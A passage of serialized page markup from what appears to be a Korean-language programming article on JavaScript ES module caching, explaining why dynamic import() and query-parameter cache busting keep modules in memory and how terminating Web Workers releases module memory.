control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./large-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" after \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"performance\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"measureUserAgentSpecificMemory\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" increase \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" after\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"bytes\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"-\"}],\" before\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"bytes\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token template-string\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"모듈 메모리 영향: \"}],[\"$\",\"span\",null,{\"className\":\"token interpolation\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"$${\"}],\"increase\",[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"}\"}]]}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\" 바이트\"}],[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}]]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"고급-주제\",\"children\":\"고급 주제\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"동적-import와-가비지-컬렉션-동작\",\"children\":\"동적 import와 가비지 컬렉션 동작\"}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-흔한-오해-동적-import는-메모리를-해제한다\",\"children\":\"❌ 흔한 오해: \\\"동적 import는 메모리를 해제한다\\\"\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":[\"동적 import(\",[\"$\",\"code\",null,{\"children\":\"import()\"}],\")도 영구 캐싱됩니다!\"]}],\" 정적 import와 동일한 모듈 레지스트리를 사용하므로 한 번 로드된 모듈은 절대 제거되지 않습니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 첫 번째 호출: 모듈 로드 \u0026 영구 캐싱\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" module1 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./heavy-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 두 번째 호출: 캐시에서 즉시 반환 (메모리 추가 사용 X)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" module2 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./heavy-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"module1 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"===\"}],\" module2\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// true - 동일한 인스턴스!\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-더-위험한-패턴-쿼리-파라미터로-캐시-우회\",\"children\":\"🚨 더 위험한 패턴: 쿼리 파라미터로 캐시 우회\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 매번 새로운 모듈 인스턴스 생성 = 메모리 누수!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"for\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"100\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"++\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" mod \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token template-string\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"./module.js?v=\"}],[\"$\",\"span\",null,{\"className\":\"token interpolation\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"$${\"}],\"i\",[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"}\"}]]}],[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}]]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 각각 별도의 모듈로 취급되어 100개 모두 메모리에 남음!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"쿼리 매개변수를 사용한 캐시 무효화(\",[\"$\",\"code\",null,{\"children\":\"import(\\\\\"}],\"./module.js?t=$\",1757580422375,\"`)`)는 새로운 모듈 인스턴스를 강제하지만, \",[\"$\",\"strong\",null,{\"children\":\"이전 인스턴스가 제거되지 않고 계속 누적되어\"}],\" 심각한 메모리 누수를 야기합니다.\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-실제-메모리-영향\",\"children\":\"📊 실제 메모리 영향\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// SPA에서 라우트별 동적 import\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"async\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"loadRoute\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"routeName\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token template-string\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"./routes/\"}],[\"$\",\"span\",null,{\"className\":\"token interpolation\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"$${\"}],\"routeName\",[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"}\"}]]}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\".js\"}],[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}]]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 사용자가 20개 라우트를 방문하면:\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// → 20개 모듈 모두 메모리에 영구 보존\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// → 각 라우트가 10MB라면 = 200MB 영구 점유\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"웹-워커와-모듈-메모리-격리\",\"children\":\"웹 워커와 모듈 메모리 격리\"}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-웹-워커의-독립적인-모듈-레지스트리\",\"children\":\"🔐 웹 워커의 독립적인 모듈 레지스트리\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"웹 워커는 \",[\"$\",\"strong\",null,{\"children\":\"완전히 독립된 JavaScript 실행 환경\"}],\"을 제공하며, 각 워커는 자체 모듈 레지스트리를 보유합니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 메인 스레드\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" worker1 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" worker2 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// worker.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" heavyModule \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./heavy-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 10MB 모듈\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 결과:\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - 메인 스레드: heavy-module.js 로드 안 됨\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - Worker 1: heavy-module.js 독립 인스턴스 (10MB)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// - Worker 2: heavy-module.js 또 다른 독립 인스턴스 (10MB)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// → 총 20MB 메모리 사용!\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-메모리-격리의-장단점\",\"children\":\"📊 메모리 격리의 장단점\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"장점:\"}]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"✅ \",[\"$\",\"strong\",null,{\"children\":\"완벽한 격리\"}],\": 워커 간 모듈 상태 간섭 없음\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"✅ \",[\"$\",\"strong\",null,{\"children\":\"독립적 GC\"}],\": 워커 종료 시 해당 워커의 모든 모듈 메모리 해제\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"✅ \",[\"$\",\"strong\",null,{\"children\":\"보안 강화\"}],\": 워커 간 코드 공유 불가능\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"단점:\"}]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"❌ \",[\"$\",\"strong\",null,{\"children\":\"메모리 중복\"}],\": 같은 모듈도 워커마다 별도 로드\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"❌ \",[\"$\",\"strong\",null,{\"children\":\"초기화 비용\"}],\": 각 워커가 모듈을 처음부터 평가\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"❌ \",[\"$\",\"strong\",null,{\"children\":\"캐시 비효율\"}],\": 모듈 캐싱 이점 없음\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-워커-종료로-모듈-메모리-해제하기\",\"children\":\"🎯 워커 종료로 모듈 메모리 해제하기\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"웹 워커만이 ES6 모듈 메모리를 실제로 해제할 수 있는 유일한 방법입니다:\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 메인 스레드\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" worker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/heavy-worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// heavy-worker.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" process \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./huge-library.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 50MB 라이브러리\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method-variable function-variable method function property-access\",\"children\":\"onmessage\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"e\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"process\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"  self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"postMessage\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"result\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 작업 완료 후 워커 종료\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[\"worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"terminate\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ← 50MB 완전히 해제됨! 🎉\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"worker \",[\"$\",\"span\",null,{\"className\":\"token 